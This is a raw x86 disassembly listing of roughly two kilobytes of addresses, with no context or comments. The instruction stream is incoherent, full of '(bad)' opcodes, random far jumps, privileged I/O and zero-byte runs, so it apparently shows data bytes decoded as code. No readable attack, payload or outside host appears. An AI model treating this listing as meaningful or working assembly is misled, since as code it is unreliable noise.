  4237ee:	mov    ecx,ebp
  4237f0:	add    esi,DWORD PTR [ebp+0x32]
  4237f3:	shr    DWORD PTR [edi-0x55],0x42
  4237f7:	jmp    0x492d7774
  4237fc:	mov    ebx,DWORD PTR [edi]
  4237fe:	loop   0x423864
  423800:	ret    
  423801:	mov    al,ds:0x77456458
  423806:	mov    ecx,fs
  423808:	or     DWORD PTR [ebx+eiz*1],0xffffff9d
  42380c:	stc    
  42380d:	sbb    bl,0xf0
  423810:	outs   dx,DWORD PTR ds:[esi]
  423811:	add    BYTE PTR [eax],al
  423813:	add    BYTE PTR [eax],al
  423815:	add    BYTE PTR [ebp-0x7e],ch
  423818:	adc    dh,bh
  42381a:	outs   dx,DWORD PTR ds:[esi]
  42381b:	add    eax,0x2dd9d8a9
  423820:	stc    
  423821:	jmp    FWORD PTR [ecx+0xa]
  423824:	ins    BYTE PTR es:[edi],dx
  423825:	dec    esi
  423826:	ins    DWORD PTR es:[edi],dx
  423827:	cmp    BYTE PTR [ecx-0x142cf782],bl
  42382d:	jmp    0x4237fd
  42382f:	leave  
  423830:	ins    BYTE PTR es:[edi],dx
  423831:	hlt    
  423832:	mov    edi,0x7507dae1
  423837:	add    ch,cl
  423839:	fstp   TBYTE PTR [eax+0x58]
  42383c:	jmp    0x6cfd2a44
  423841:	iret   
  423842:	sub    DWORD PTR [edi+esi*2],ebx
  423845:	cs (bad) 
  423847:	sti    
  423848:	dec    esi
  423849:	jmp    0x568e:0x81b18d8e
  423850:	retf   0xbf56
  423853:	jmp    0x4237f1
  423855:	add    al,0x75
  423857:	sub    eax,0xbc5d52a6
  42385c:	jns    0x423848
  42385e:	outs   dx,BYTE PTR ds:[esi]
  42385f:	lea    esi,[eax+edi*8]
  423862:	mov    bh,0x39
  423864:	jo     0x42386b
  423866:	mov    DWORD PTR [ebp-0x15a15f00],0xdd5f59c6
  423870:	xchg   DWORD PTR [esi+eiz*2-0x4bd8fe75],esi
  423877:	fld    DWORD PTR [ecx]
  423879:	mov    edx,0x0
  42387e:	add    BYTE PTR [esi-0x3e],cl
  423881:	or     BYTE PTR [edi+0x1e],0x88
  423885:	inc    ebp
  423886:	inc    edx
  423887:	scas   al,BYTE PTR es:[edi]
  423888:	cmp    al,0x57
  42388a:	xor    BYTE PTR [ebx],dh
  42388c:	push   cs
  42388d:	add    BYTE PTR [edi-0x25172c6d],bl
  423893:	jbe    0x423897
  423895:	add    BYTE PTR [edi],bl
  423897:	mov    ch,0x26
  423899:	or     al,ch
  42389b:	mov    al,BYTE PTR [edx+edx*2]
  42389e:	add    DWORD PTR [eax],ebx
  4238a0:	test   dl,bh
  4238a2:	push   cs
  4238a3:	push   0xffffffc4
  4238a5:	pop    edx
  4238a6:	sub    esi,DWORD PTR [ebp+0x2]
  4238a9:	xchg   DWORD PTR [edi+0x6d02c3de],esp
  4238af:	arpl   WORD PTR [edx+0x0],ax
  4238b2:	fs mov cl,0x55
  4238b5:	push   es
  4238b6:	jb     0x423876
  4238b8:	push   eax
  4238b9:	sti    
  4238ba:	cmp    BYTE PTR [ecx+0x76e1625f],bh
  4238c0:	mov    edx,ecx
  4238c2:	rcr    BYTE PTR [edi+0x45c6fbc6],0x89
  4238c9:	in     al,dx
  4238ca:	sbb    BYTE PTR [eax+0x61],al
  4238cd:	ja     0x4238b0
  4238cf:	jbe    0x423927
  4238d1:	add    al,0x79
  4238d3:	jno    0x4238a0
  4238d5:	mov    edi,0xda156a
  4238da:	aaa    
  4238db:	sbb    DWORD PTR [edx+0x13],esp
  4238de:	sub    DWORD PTR [ecx+0x6a],edi
  4238e1:	xor    dh,0x0
  4238e4:	add    BYTE PTR [eax],al
  4238e6:	add    BYTE PTR [eax],al
  4238e8:	mov    dh,0x2
  4238ea:	call   0xf8047bef
  4238ef:	jmp    edi
  4238f1:	rol    DWORD PTR [ebp-0x7cd1af0a],cl
  4238f7:	push   es
  4238f8:	fbld   TBYTE PTR [edx-0x4]
  4238fb:	add    cl,cl
  4238fd:	sbb    bh,ah
  4238ff:	push   ecx
  423900:	add    ch,ch
  423902:	push   eax
  423903:	sbb    al,0xa1
  423905:	ret    
  423906:	jne    0x42392a
  423908:	xchg   edi,eax
  423909:	inc    edx
  42390a:	cld    
  42390b:	test   DWORD PTR [edi+ebp*2+0x13],ecx
  42390f:	mov    esp,DWORD PTR [ebx+ebx*2]
  423912:	push   ebp
  423913:	clc    
  423914:	out    dx,al
  423915:	xor    esi,edi
  423917:	push   ecx
  423918:	cmp    BYTE PTR [ebx-0x76ef8b40],al
  42391e:	gs clc 
  423920:	or     al,0x61
  423922:	inc    ebp
  423923:	cld    
  423924:	push   edi
  423925:	fisttp DWORD PTR [ebx-0x1]
  423928:	sub    eax,0x20682dc
  42392d:	in     eax,dx
  42392e:	push   eax
  42392f:	or     BYTE PTR [edi+0x42],ah
  423932:	clc    
  423933:	pop    esi
  423934:	popa   
  423935:	ret    
  423936:	je     0x42393d
  423938:	push   ebp
  423939:	dec    eax
  42393a:	or     bl,ch
  42393c:	neg    DWORD PTR [eax]
  42393e:	ror    cl,0xf
  423941:	push   eax
  423942:	sub    esp,0x6d
  423945:	pop    ebp
  423946:	inc    eax
  423947:	or     BYTE PTR [edi],bl
  423949:	aas    
  42394a:	cld    
  42394b:	add    BYTE PTR [eax],al
  42394d:	add    BYTE PTR [eax],al
  42394f:	add    BYTE PTR [eax],al
  423951:	daa    
  423952:	fimul  WORD PTR [ebp+edx*2-0xafc728]
  423959:	ins    DWORD PTR es:[edi],dx
  42395a:	push   ds
  42395b:	test   eax,eax
  42395d:	inc    eax
  42395e:	add    bh,BYTE PTR [ebx+0x65]
  423961:	fadd   DWORD PTR [esi]
  423963:	add    DWORD PTR [ebp-0x28],0xffffff9b
  423967:	mov    ebx,0x54017556
  42396c:	adc    esi,DWORD PTR [ebp-0x758fa817]
  423972:	sub    DWORD PTR [eax+ebp*8],eax
  423975:	add    DWORD PTR [esi+0x58fefbe9],esp
  42397b:	jnp    0x42396f
  42397d:	shl    ecx,0x50
  423980:	sti    
  423981:	leave  
  423982:	or     eax,0xa560faf8
  423987:	adc    al,0x40
  423989:	jne    0x4239ef
  42398b:	in     al,dx
  42398c:	test   DWORD PTR [edx],ebp
  42398e:	mov    ch,0x2a
  423990:	xchg   DWORD PTR [ebx-0x80],edi
  423993:	push   ecx
  423994:	sti    
  423995:	lds    ecx,FWORD PTR [ecx]
  423997:	jnp    0x423959
  423999:	mov    BYTE PTR [ebx],al
  42399b:	stc    
  42399c:	mov    dl,0xb9
  42399e:	add    eax,0x9a7b8714
  4239a3:	push   ecx
  4239a4:	sti    
  4239a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239a6:	loope  0x423a22
  4239a8:	shr    BYTE PTR [eax-0x2d],0xe8
  4239ac:	je     0x42393f
  4239ae:	aad    0x7c
  4239b0:	add    cl,BYTE PTR [ebx+0x8]
  4239b3:	push   esp
  4239b4:	xor    BYTE PTR [eax],al
  4239b6:	add    BYTE PTR [eax],al
  4239b8:	add    BYTE PTR [eax],al
  4239ba:	lock sub BYTE PTR [ebx+0xc],ch
  4239be:	(bad)  
  4239bf:	out    dx,al
  4239c0:	pop    ebp
  4239c1:	add    BYTE PTR [ebx],ah
  4239c3:	lock dec edi
  4239c5:	inc    eax
  4239c6:	clc    
  4239c7:	test   al,0x6b
  4239c9:	or     dh,ch
  4239cb:	out    0x51,al
  4239cd:	sti    
  4239ce:	inc    ebp
  4239cf:	loope  0x423a05
  4239d1:	repnz inc edx
  4239d3:	ror    BYTE PTR [edx],1
  4239d5:	inc    eax
  4239d6:	xchg   BYTE PTR [ecx],ch
  4239d8:	add    al,0x87
  4239da:	mov    bl,0xff
  4239dc:	inc    ebp
  4239dd:	mov    esi,0x874ae981
  4239e2:	cdq    
  4239e3:	stc    
  4239e4:	jl     0x423a2b
  4239e6:	ins    DWORD PTR es:[edi],dx
  4239e7:	add    bh,BYTE PTR [ebx]
  4239e9:	push   ecx
  4239ea:	lea    edi,[edi]
  4239ec:	call   0x677e:0x998a6ee8
  4239f3:	push   edi
  4239f4:	and    eax,DWORD PTR [ebp+0x7ce9ded8]
  4239fa:	ja     0x42398b
  4239fc:	sub    al,0xe8
  4239fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239ff:	(bad)  
  423a01:	movd   DWORD PTR [ebp+0x34a4141c],mm2
  423a08:	bound  edx,QWORD PTR [ebx-0x73]
  423a0b:	xchg   DWORD PTR [ecx],ebp
  423a0d:	outs   dx,DWORD PTR ds:[esi]
  423a0e:	jns    0x423991
  423a10:	int3   
  423a11:	out    0x75,eax
  423a13:	mov    ebx,esp
  423a15:	push   ecx
  423a16:	push   ds
  423a17:	xor    esi,ecx
  423a19:	jl     0x4239cb
  423a1b:	fisubr WORD PTR [esi-0xd]
  423a1e:	add    BYTE PTR [eax],al
  423a20:	add    BYTE PTR [eax],al
  423a22:	add    al,bh
  423a24:	ret    0xabd
  423a27:	repnz or bh,BYTE PTR [edi-0x47225a18]
  423a2e:	push   ebx
  423a2f:	repnz fisubr DWORD PTR [esi+0x1]
  423a33:	inc    edi
  423a34:	fnstsw WORD PTR [ecx+0x64c29bfb]
  423a3a:	call   0xdc6bb0ad
  423a3f:	sub    eax,0xce0f74dd
  423a44:	push   edi
  423a45:	fld1   
  423a47:	inc    eax
  423a48:	push   cs
  423a49:	add    DWORD PTR [ecx],esp
  423a4b:	mov    esi,0xbd7be2dd
  423a50:	xchg   edx,ebx
  423a52:	jno    0x423acd
  423a54:	adc    BYTE PTR [ecx+0x248965db],ch
  423a5a:	cld    
  423a5b:	xor    ebp,edx
  423a5d:	mov    eax,0x6edd9ee6
  423a62:	hlt    
  423a63:	clc    
  423a64:	aam    0x0
  423a66:	cmp    al,0x75
  423a68:	sub    al,0xd7
  423a6a:	ret    0x8565
  423a6d:	add    bh,BYTE PTR [esi]
  423a6f:	sub    ebx,ecx
  423a71:	push   eax
  423a72:	leave  
  423a73:	out    dx,eax
  423a74:	mov    edx,0xd9b8ef87
  423a79:	push   eax
  423a7a:	loope  0x423a71
  423a7c:	mov    ah,0xb
  423a7e:	pop    ebp
  423a7f:	test   DWORD PTR ss:[ebx],eax
  423a82:	push   ss
  423a83:	pop    edx
  423a84:	xor    cl,BYTE PTR [eax]
  423a86:	arpl   WORD PTR [eax],ax
  423a88:	add    BYTE PTR [eax],al
  423a8a:	add    BYTE PTR [eax],al
  423a8c:	ss xor eax,0x9c000f5b
  423a92:	adc    cl,ch
  423a94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a95:	test   esp,ebp
  423a97:	push   0x15
  423a99:	fidivr DWORD PTR [edi+0x45]
  423a9c:	gs dec ebp
  423a9e:	push   edx
  423a9f:	mov    dh,0x67
  423aa1:	fnstcw WORD PTR [edi-0x3c]
  423aa4:	push   0x3
  423aa6:	mov    DWORD PTR [ebp+0x6b0afa72],edi
  423aac:	scas   al,BYTE PTR es:[edi]
  423aad:	add    eax,DWORD PTR [eax]
  423aaf:	jmp    0x1668131
  423ab4:	mov    eax,ds:0x769599ea
  423ab9:	add    al,BYTE PTR [ecx+ebp*1-0x17a67f1e]
  423ac0:	jbe    0x423ac4
  423ac2:	das    
  423ac3:	sub    DWORD PTR [ecx],esi
  423ac5:	mov    eax,DWORD PTR [ebp+eax*8+0x72]
  423ac9:	sbb    eax,DWORD PTR [ebp-0x23]
  423acc:	ret    
  423acd:	cmp    BYTE PTR [eax+ebp*8],0x76
  423ad1:	add    al,BYTE PTR [edi+0x400b9d04]
  423ad7:	jmp    0x3e528a0b
  423adc:	dec    edi
  423add:	fsincos 
  423adf:	adc    eax,0xe830f8
  423ae4:	sub    BYTE PTR [ebp-0x2ef80009],dl
  423aea:	mov    DWORD PTR [eax+edi*2+0x26],esi
  423aee:	xor    esi,edi
  423af0:	add    BYTE PTR [eax],al
  423af2:	add    BYTE PTR [eax],al
  423af4:	add    BYTE PTR [ebx-0x73fee1a4],ah
  423afa:	add    BYTE PTR [eax+0x7400607d],al
  423b00:	push   cs
  423b01:	stos   BYTE PTR es:[edi],al
  423b02:	jecxz  0x423b79
  423b04:	or     ah,dh
  423b06:	cmp    BYTE PTR [ecx+0x0],0x4c
  423b0a:	mov    edi,0x5c00e2
  423b0f:	add    DWORD PTR [ebp+0x54],0xffffffb8
  423b13:	pop    ebx
  423b14:	jns    0x423b62
  423b16:	add    BYTE PTR [ecx-0x72f597bc],cl
  423b1c:	inc    esp
  423b1d:	js     0x423b11
  423b1f:	dec    edi
  423b20:	mov    DWORD PTR [eax-0x4],eax
  423b23:	pop    ss
  423b24:	call   0x428da5
  423b29:	mov    BYTE PTR [edi-0x6c7bf9],bh
  423b2f:	(bad)  
  423b30:	call   DWORD PTR [ecx-0x23d7dbe5]
  423b36:	in     al,0x74
  423b38:	and    al,0x2c
  423b3a:	mov    eax,0xffdc766f
  423b3f:	or     BYTE PTR [eax+edi*4-0x9],0x88
  423b44:	dec    esp
  423b45:	mov    eax,0xa48b512b
  423b4a:	popf   
  423b4b:	inc    esp
  423b4c:	and    al,0x8
  423b4e:	add    BYTE PTR [ecx-0x76dc47bc],cl
  423b54:	jl     0x423b0e
  423b56:	aas    
  423b57:	call   0x423c51
  423b5c:	add    BYTE PTR [eax],al
  423b5e:	ins    BYTE PTR es:[edi],dx
  423b5f:	in     eax,0xf7
  423b61:	test   ah,bl
  423b63:	aad    0x7f
  423b65:	xor    DWORD PTR [ebp-0x17],0xffffffff
  423b69:	dec    DWORD PTR [ebx-0x5d]
  423b6c:	inc    eax
  423b6d:	and    al,0x86
  423b6f:	jmp    0x6e6d0b58
  423b74:	cmp    BYTE PTR [ecx+eax*2],ah
  423b77:	bound  eax,QWORD PTR [eax+0x24]
  423b7a:	inc    ebp
  423b7b:	bound  ebp,QWORD PTR [eax+0x24]
  423b7e:	popa   
  423b7f:	jno    0x423b3e
  423b81:	jl     0x423bf8
  423b83:	jmp    0x7cf12c00
  423b88:	jo     0x423be9
  423b8a:	retf   
  423b8b:	mov    ecx,ss
  423b8d:	xchg   DWORD PTR [ecx-0x54afe033],ebp
  423b93:	pop    esp
  423b94:	jo     0x423bba
  423b96:	sbb    DWORD PTR [eax-0x1bfd1741],0x28f1fbe4
  423ba0:	jo     0x423bbe
  423ba2:	xor    dh,BYTE PTR [ebp-0x4b07efe5]
  423ba8:	sbb    esi,DWORD PTR [ecx*1+0x750062c4]
  423baf:	ins    DWORD PTR es:[edi],dx
  423bb0:	les    esi,FWORD PTR [esp+edi*2+0x1c]
  423bb4:	cmp    BYTE PTR [eiz*2+0x7224402b],ah
  423bbb:	jmp    0x101b:0xacfafb30
  423bc2:	add    BYTE PTR [eax],al
  423bc4:	add    BYTE PTR [eax],al
  423bc6:	add    dl,dh
  423bc8:	je     0x423be5
  423bca:	adc    al,bh
  423bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bcd:	sbb    esi,DWORD PTR [ecx*8+0x7500638c]
  423bd4:	push   eax
  423bd5:	hlt    
  423bd6:	aaa    
  423bd7:	retf   0xaa55
  423bda:	or     BYTE PTR [ecx-0x33],0xf4
  423bde:	inc    DWORD PTR [esi-0x46]
  423be1:	in     al,0x74
  423be3:	xchg   ecx,eax
  423be4:	add    ah,BYTE PTR [ecx]
  423be6:	jns    0x423c21
  423be8:	es and ebp,esp
  423beb:	and    DWORD PTR [esi],esp
  423bed:	or     esp,ebx
  423bef:	or     BYTE PTR [esi-0x17],dl
  423bf2:	add    ebp,eax
  423bf4:	push   ebp
  423bf5:	or     eax,0x9029d34
  423bfa:	in     eax,0x8e
  423bfc:	mov    WORD PTR ds:0x19ea6920,?
  423c02:	jno    0x423c79
  423c04:	add    ah,BYTE PTR [edx-0x6edd6691]
  423c0a:	pop    esi
  423c0b:	jmp    0xc51e:0xb97892d8
  423c12:	inc    ebx
  423c13:	in     al,dx
  423c14:	ds int 0x1f
  423c17:	mov    bh,BYTE PTR [edi]
  423c19:	aad    0xf4
  423c1b:	enter  0x73cc,0xe4
  423c1f:	ds mov ch,dh
  423c22:	pop    ds
  423c23:	pop    ebp
  423c24:	jmp    0x299:0x2757115
  423c2b:	add    BYTE PTR [eax],al
  423c2d:	add    BYTE PTR [eax],al
  423c2f:	add    BYTE PTR [edx],dl
  423c31:	push   cs
  423c32:	outs   dx,DWORD PTR fs:[esi]
  423c34:	pop    ecx
  423c35:	cli    
  423c36:	inc    eax
  423c37:	add    al,0x8a
  423c39:	add    ch,cl
  423c3b:	xor    DWORD PTR ds:0xf2489b3a,esi
  423c41:	fist   WORD PTR [ecx+eax*8+0x78940265]
  423c48:	or     DWORD PTR [esi-0x190b14f3],eax
  423c4e:	add    esi,DWORD PTR gs:[ebp+0x2]
  423c52:	mov    dh,0x4d
  423c54:	inc    esi
  423c55:	adc    eax,0xd953502e
  423c5a:	outs   dx,BYTE PTR ds:[esi]
  423c5b:	repz into 
  423c5d:	push   eax
  423c5e:	in     eax,0x50
  423c60:	fst    st(7)
  423c62:	add    BYTE PTR [ecx+ebx*8],ah
  423c65:	fisttp QWORD PTR [edi-0x7d]
  423c68:	rcr    ebp,1
  423c6a:	jb     0x423c5d
  423c6c:	add    DWORD PTR [edi],edi
  423c6e:	and    al,0xd
  423c70:	(bad)  
  423c71:	jmp    0x434f:0xdd96a4ed
  423c78:	xchg   esi,eax
  423c79:	fnsave [edx-0xb]
  423c7c:	add    DWORD PTR [edi],edi
  423c7e:	and    al,0xf5
  423c80:	inc    ebx
  423c81:	jmp    0xb987:0xdd96a4dd
  423c88:	call   0x921b60db
  423c8d:	ss and al,0xc9
  423c90:	xchg   DWORD PTR [esi+0x61],edi
  423c93:	call   0x423c98
  423c98:	add    BYTE PTR [esi+0x2],dh
  423c9b:	cmp    DWORD PTR ds:0x6d0b2a8d,ebp
  423ca1:	mov    es,WORD PTR [ebx]
  423ca3:	add    cl,ch
  423ca5:	imul   ebp,ecx,0xb
  423ca8:	ins    DWORD PTR es:[edi],dx
  423ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423caa:	add    eax,DWORD PTR [eax]
  423cac:	jmp    0xdd4a740f
  423cb1:	sub    bl,ah
  423cb3:	je     0x423cba
  423cb5:	pop    ecx
  423cb6:	fnsave [ebp+ecx*1+0x4d]
  423cba:	jmp    0x2186:0xdd172329
  423cc1:	and    BYTE PTR [ecx+eax*1],dl
  423cc4:	jmp    0xd86c43f
  423cc9:	dec    ebp
  423cca:	xor    cl,BYTE PTR [ecx-0x17edad73]
  423cd0:	sbb    edx,DWORD PTR [ebx+0x2]
  423cd3:	add    BYTE PTR [edx-0x37],dh
  423cd6:	mov    bh,BYTE PTR [ebp+ecx*8-0x1e]
  423cda:	maskmovq mm3,mm6
  423cdd:	repnz repnz add BYTE PTR [eax],al
  423ce1:	fadd   QWORD PTR [edi+esi*8]
  423ce4:	je     0x423c96
  423ce6:	sub    al,0x8d
  423ce8:	pop    esp
  423ce9:	mov    al,0x1c
  423ceb:	div    DWORD PTR [eax+esi*4+0x20]
  423cef:	call   0xf8251abc
  423cf4:	mov    eax,DWORD PTR [eax+0x2a]
  423cf7:	and    al,0x83
  423cf9:	xor    BYTE PTR [edx],ch
  423cfb:	sbb    BYTE PTR [eax],al
  423cfd:	add    BYTE PTR [eax],al
  423cff:	add    BYTE PTR [eax],al
  423d01:	add    dl,dl
  423d03:	inc    eax
  423d04:	and    al,0xf
  423d06:	pushf  
  423d07:	mov    esi,ebp
  423d09:	movups xmm0,xmm4
  423d0c:	add    BYTE PTR [eax],al
  423d0e:	mov    WORD PTR [edi-0x12],fs
  423d11:	cmp    dl,BYTE PTR [edi]
  423d13:	int3   
  423d14:	lea    ecx,[eax+0x56]
  423d17:	add    edi,ebp
  423d19:	sbb    DWORD PTR [eax+eax*1],0x62
  423d1d:	cmp    dl,ch
  423d1f:	inc    edi
  423d20:	and    al,0x18
  423d22:	aad    0x3f
  423d24:	and    al,0x14
  423d26:	xchg   edi,eax
  423d27:	ins    BYTE PTR es:[edi],dx
  423d28:	add    DWORD PTR [eax+esi*1+0x4c000086],0x6a
  423d30:	test   eax,eax
  423d32:	inc    eax
  423d33:	push   es
  423d34:	pop    esi
  423d35:	cmp    ebx,esp
  423d37:	stc    
  423d38:	push   es
  423d39:	test   DWORD PTR [ebx+eax*1-0x76ce0000],ebx
  423d40:	test   BYTE PTR [eax+edi*4],ah
  423d43:	add    eax,DWORD PTR [eax]
  423d45:	add    BYTE PTR [edx-0x75],al
  423d48:	shl    BYTE PTR [edx+edx*1+0x6a],0x39
  423d4d:	inc    edi
  423d4e:	add    al,0x3b
  423d50:	ins    DWORD PTR es:[edi],dx
  423d51:	(bad)  
  423d52:	rcr    BYTE PTR [edi],1
  423d54:	pop    eax
  423d55:	push   eax
  423d56:	add    cl,ch
  423d58:	inc    esp
  423d59:	and    al,0xd4
  423d5b:	and    al,0x22
  423d5d:	mov    DWORD PTR [ebp-0x5b],esi
  423d60:	and    edi,DWORD PTR [edx+ebx*8]
  423d63:	into   
  423d64:	jmp    0x423d74
  423d66:	add    BYTE PTR [eax],al
  423d68:	add    BYTE PTR [eax],al
  423d6a:	add    BYTE PTR ds:0x91448ce9,dh
  423d70:	xchg   ebp,eax
  423d71:	mov    al,BYTE PTR [ecx+ebx*4-0x47]
  423d75:	das    
  423d76:	mov    DWORD PTR [ecx],esi
  423d78:	mov    ebp,0xad88fb43
  423d7d:	repnz aas 
  423d7f:	jne    0x423de7
  423d81:	push   eax
  423d82:	and    al,0x69
  423d84:	bound  ecx,QWORD PTR [eax+0x24]
  423d87:	xor    DWORD PTR [eax-0x17dadbb8],esp
  423d8d:	(bad)  
  423d8e:	push   DWORD PTR [ebp-0x4f]
  423d91:	dec    ebp
  423d92:	xchg   ebx,eax
  423d93:	adc    DWORD PTR [eax+0x401c088],0x1d
  423d9a:	jl     0x423d35
  423d9c:	std    
  423d9d:	push   ecx
  423d9e:	or     al,0xfe
  423da0:	and    al,0x28
  423da2:	adc    al,0xca
  423da4:	fs (bad) 
  423da6:	call   0xfc20aa40
  423dab:	push   edx
  423dac:	or     eax,0xf59c2428
  423db1:	daa    
  423db2:	adc    BYTE PTR [esi-0x6eb31ea4],cl
  423db8:	mov    cl,0x2c
  423dba:	neg    DWORD PTR [ebp+edi*4+0x23]
  423dbe:	adc    al,0x33
  423dc0:	popf   
  423dc1:	and    ecx,DWORD PTR [ebx]
  423dc3:	je     0x423df5
  423dc5:	dec    eax
  423dc6:	and    al,0x7d
  423dc8:	fs dec eax
  423dca:	and    al,0x59
  423dcc:	jmp    0x0:0x243b
  423dd3:	add    BYTE PTR [ebp-0x16],ah
  423dd6:	cmp    esp,DWORD PTR [ecx+ebp*2]
  423dd9:	in     al,dx
  423dda:	fdivr  QWORD PTR [ecx]
  423ddc:	mov    cl,0xfd
  423dde:	sti    
  423ddf:	or     dh,bh
  423de1:	add    DWORD PTR [eax+eiz*8+0x6069d6ee],esi
  423de8:	cdq    
  423de9:	pop    es
  423dea:	jmp    0x9619a646
  423def:	daa    
  423df0:	jno    0x423ddc
  423df2:	(bad)  
  423df3:	pop    ebp
  423df4:	jne    0x423df8
  423df6:	outs   dx,DWORD PTR ds:[esi]
  423df7:	mov    esp,0xbcb703da
  423dfc:	mov    esi,0x9affc54d
  423e01:	mov    ch,BYTE PTR [eax-0x1f]
  423e04:	scas   al,BYTE PTR es:[edi]
  423e05:	test   BYTE PTR [ebp+0x28],dl
  423e08:	push   ecx
  423e09:	jmp    0x57ca:0x275534d
  423e10:	pop    ecx
  423e11:	and    dl,cl
  423e13:	pop    edx
  423e14:	hlt    
  423e15:	xlat   BYTE PTR ds:[ebx]
  423e16:	mov    edx,0x11e09e0
  423e1b:	in     al,dx
  423e1c:	add    eax,0x6ee0ab81
  423e21:	dec    edi
  423e22:	int    0x13
  423e24:	pop    ebp
  423e25:	pop    esi
  423e26:	push   0x33365ee1
  423e2b:	mov    ds,WORD PTR [edx]
  423e2d:	cmp    bl,BYTE PTR [esi-0x1a]
  423e30:	mov    al,0xc0
  423e32:	in     eax,dx
  423e33:	add    esp,DWORD PTR [eax+0x848d89]
  423e39:	add    BYTE PTR [eax],al
  423e3b:	add    BYTE PTR [eax],al
  423e3d:	pop    ecx
  423e3e:	(bad)  [esi+0x5e]
  423e41:	ins    DWORD PTR es:[edi],dx
  423e42:	(bad)  
  423e43:	pop    ebp
  423e44:	lds    esp,FWORD PTR [ebx+0x1d02cf0b]
  423e4a:	lock pop edx
  423e4c:	loopne 0x423e6c
  423e4e:	jmp    0x3e44:0x8a3515e7
  423e55:	sar    esi,cl
  423e57:	call   0x67293092
  423e5c:	out    0xfd,eax
  423e5e:	add    DWORD PTR [eax],0x86fe6eb4
  423e64:	sub    ecx,DWORD PTR [eax+0xb]
  423e67:	jmpw   0xf49
  423e6b:	std    
  423e6c:	push   ds
  423e6d:	aad    0xdd
  423e6f:	(bad)  
  423e70:	fidiv  DWORD PTR [esi-0x47531a83]
  423e76:	(bad)  
  423e77:	inc    DWORD PTR ds:0x9b041e22
  423e7d:	push   eax
  423e7e:	add    esp,DWORD PTR [esi-0x18]
  423e81:	into   
  423e82:	adc    eax,0x94d2eefc
  423e87:	add    al,0xe9
  423e89:	retf   
  423e8a:	dec    esi
  423e8b:	and    al,0xe5
  423e8d:	fs pop esp
  423e8f:	add    BYTE PTR [ebx+0x70],al
  423e92:	jmp    0xedbe:0xd9b2cd2e
  423e99:	jbe    0x423eca
  423e9b:	xchg   ebp,ecx
  423e9d:	clc    
  423e9e:	out    0x24,al
  423ea0:	jmp    0x423ea2
  423ea2:	add    BYTE PTR [eax],al
  423ea4:	add    BYTE PTR [eax],al
  423ea6:	jbe    0x423eaa
  423ea8:	dec    edi
  423ea9:	cli    
  423eaa:	das    
  423eab:	push   ebp
  423eac:	jge    0x423e9f
  423eae:	jno    0x423ee1
  423eb0:	xchg   DWORD PTR [ebx-0x1904c90f],esp
  423eb6:	lock and eax,DWORD PTR [ecx]
  423eb9:	jmp    0xed85bc34
  423ebe:	rcr    BYTE PTR [ebx],1
  423ec0:	sbb    dh,ch
  423ec2:	cli    
  423ec3:	pop    ds
  423ec4:	add    ecx,ebp
  423ec6:	jbe    0x423ef8
  423ec8:	push   eax
  423ec9:	outs   dx,BYTE PTR ds:[esi]
  423eca:	sub    al,0x59
  423ecc:	pop    gs
  423ece:	jbe    0x423f25
  423ed0:	clc    
  423ed1:	call   0xe9d3be49
  423ed6:	jbe    0x423eda
  423ed8:	sti    
  423ed9:	(bad)  
  423eda:	jp     0x423e63
  423edc:	jne    0x423ede
  423ede:	mov    eax,0xa4ffc881
  423ee3:	setne  dh
  423ee6:	inc    ebx
  423ee7:	mov    al,al
  423ee9:	addps  xmm6,XMMWORD PTR [eax+eax*1-0x7a8e2400]
  423ef1:	fadd   QWORD PTR [ecx+0x7450f7b5]
  423ef7:	fcmovne st,st(5)
  423ef9:	inc    DWORD PTR [ebx-0x28b3f76]
  423eff:	mov    bl,0x75
  423f01:	in     al,0x64
  423f03:	scas   eax,DWORD PTR es:[edi]
  423f04:	jmp    0x3b:0xf087c3ff
  423f0b:	add    BYTE PTR [eax],al
  423f0d:	add    BYTE PTR [eax],al
  423f0f:	scas   eax,DWORD PTR es:[edi]
  423f10:	sub    al,0x4d
  423f12:	push   esi
  423f13:	and    DWORD PTR [edx-0x4c3c0224],ecx
  423f19:	push   eax
  423f1a:	push   eax
  423f1b:	mov    ah,0x4
  423f1d:	jnp    0x423f1d
  423f1f:	ret    
  423f20:	mov    eax,eax
  423f22:	je     0x423f9b
  423f24:	adc    edi,esi
  423f26:	jne    0x423ee0
  423f28:	jno    0x423f6f
  423f2a:	lock pop esp
  423f2c:	xchg   DWORD PTR [ebp-0x10],ebx
  423f2f:	aad    0x42
  423f31:	hlt    
  423f32:	mov    DWORD PTR [ecx-0xff9174a],esi
  423f38:	mov    ah,0xf7
  423f3a:	test   BYTE PTR [esp+ebp*1],cl
  423f3d:	sbb    edi,edi
  423f3f:	sub    esp,ebp
  423f41:	rol    DWORD PTR [ebx+0x5c],cl
  423f44:	jae    0x423ecb
  423f46:	fadd   st(1),st
  423f48:	mov    ah,0xf7
  423f4a:	push   eax
  423f4b:	ror    DWORD PTR [edx-0x10],1
  423f4e:	push   eax
  423f4f:	hlt    
  423f50:	(bad)  
  423f52:	call   DWORD PTR [ebx-0x6e00ba79]
  423f58:	dec    edx
  423f59:	lock call 0xfc29c6d4
  423f5f:	adc    cl,BYTE PTR [edi+eiz*8-0x25c40ac4]
  423f66:	lea    ecx,[eax-0x1e3f18c3]
  423f6c:	or     ebx,edx
  423f6e:	out    0x94,eax
  423f70:	rol    DWORD PTR [ebx],0x1
  423f73:	add    BYTE PTR [eax],al
  423f75:	add    BYTE PTR [eax],al
  423f77:	add    BYTE PTR [ebp-0x17],dh
  423f7a:	nop
  423f7b:	test   ecx,eax
  423f7d:	neg    cl
  423f7f:	sti    
  423f80:	inc    ebp
  423f81:	in     al,dx
  423f82:	push   ecx
  423f83:	add    al,0xd2
  423f85:	into   
  423f86:	pop    ss
  423f87:	adc    DWORD PTR ds:0x773d47e9,esi
  423f8d:	jmp    0x45c5:0x8342ffff
  423f94:	mov    dl,0xea
  423f96:	pop    ss
  423f97:	pop    ebp
  423f98:	stos   BYTE PTR es:[edi],al
  423f99:	xor    eax,0xd138873b
  423f9e:	adc    dl,dh
  423fa0:	div    BYTE PTR [ecx+0x686d71fe]
  423fa6:	(bad)  
  423fa7:	cli    
  423fa8:	and    eax,0x2a08c568
  423fad:	mov    cl,0xc4
  423faf:	nop
  423fb0:	jnp    0x423f3e
  423fb2:	mov    eax,esi
  423fb4:	scas   al,BYTE PTR es:[edi]
